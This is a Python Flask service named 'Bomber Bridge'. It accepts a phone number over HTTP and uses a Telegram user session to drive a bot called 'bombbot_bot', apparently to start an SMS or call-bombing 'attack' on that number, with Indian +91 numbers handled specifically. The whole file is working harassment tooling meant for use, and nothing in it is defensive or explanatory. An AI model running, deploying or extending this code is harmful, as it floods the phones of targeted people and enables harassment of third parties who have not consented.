import asyncio
import re
import logging
import os
import threading
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
SESSION_STRING = os.getenv("SESSION_STRING", "")
BRIDGE_SECRET = os.getenv("BRIDGE_SECRET", "mysecret123")
BOT_USERNAME = "bombbot_bot"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Background loop for async
_bg_loop = asyncio.new_event_loop()
def _start_bg_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
_bg_thread = threading.Thread(target=_start_bg_loop, args=(_bg_loop,), daemon=True)
_bg_thread.start()

_client = None

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, _bg_loop)
    return future.result(timeout=120)

async def get_client():
    global _client
    if _client is None:
        _client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH, loop=_bg_loop)
    if not _client.is_connected():
        await _client.connect()
    return _client

async def do_attack(number):
    client = await get_client()
    if not await client.is_user_authorized():
        return {"status": "failed", "error": "Session expired"}

    num = re.sub(r'[\s\-\+\(\)]', '', number)
    if len(num) == 10:
        num = f"+91{num}"
    elif len(num) == 12 and num.startswith("91"):
        num = f"+{num}"

    bot = await client.get_entity(BOT_USERNAME)
    await client.send_message(bot, "/menu")
    await asyncio.sleep(1.5) # Sleep reduced for faster response

    async for msg in client.iter_messages(bot, limit=10):
        if msg.buttons:
            for row in msg.buttons:
                for btn in row:
                    if "START" in btn.text.upper():
                        await btn.click()
                        break
                else:
                    continue
                break
            break
        break

    await asyncio.sleep(1.5)
    await client.send_message(bot, num)
    await asyncio.sleep(1.5)

    async for msg in client.iter_messages(bot, limit=2):
        if not msg.outgoing and msg.text:
            return {"status": "success", "target": num, "bot_response": msg.text}
    return {"status": "success", "target": num, "bot_response": "Sent"}

@app.route("/", methods=["POST"])
def handle():
    data = request.get_json(force=True, silent=True)
    if not data or data.get("secret") != BRIDGE_SECRET:
        return jsonify({"error": "Secret galat hai"}), 403
    if data.get("action") != "bomb" or not data.get("number"):
        return jsonify({"error": "Sahi number daal bhai"}), 400
    try:
        result = run_async(do_attack(data["number"]))
        return jsonify(result)
    except Exception as e:
        logger.exception("Attack failed")
        return jsonify({"status": "failed", "error": str(e)}), 500

@app.route("/", methods=["GET"])
def home():
    return jsonify({"service": "Bomber Bridge", "status": "running"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, threaded=True)
